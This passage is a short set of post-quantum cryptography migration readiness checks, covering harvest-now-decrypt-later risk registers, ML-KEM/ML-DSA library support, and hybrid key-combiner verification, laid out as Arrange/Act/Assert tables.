| HNDL prioritization | Migrate long-lived secrets first (root CAs, long-term archives) | Real threat for >10-year confidentiality requirements |

### Transition readiness quick checks (preserved mini-TCs)

| Check | Arrange | Act | Assert |
|-------|---------|-----|--------|
| HNDL risk register | Audit encrypted traffic + key inventory | Catalog secrets with >10-year confidentiality needs | Risk register produced, migration-ordered |
| Library PQC readiness | Inventory crypto libraries in the estate | Test ML-KEM/ML-DSA support per library | Readiness report with gaps flagged |
| Combiner strength | Inspect hybrid implementation | Verify HKDF (not XOR) combiner at KDF call sites | Strong combiner confirmed or finding raised |
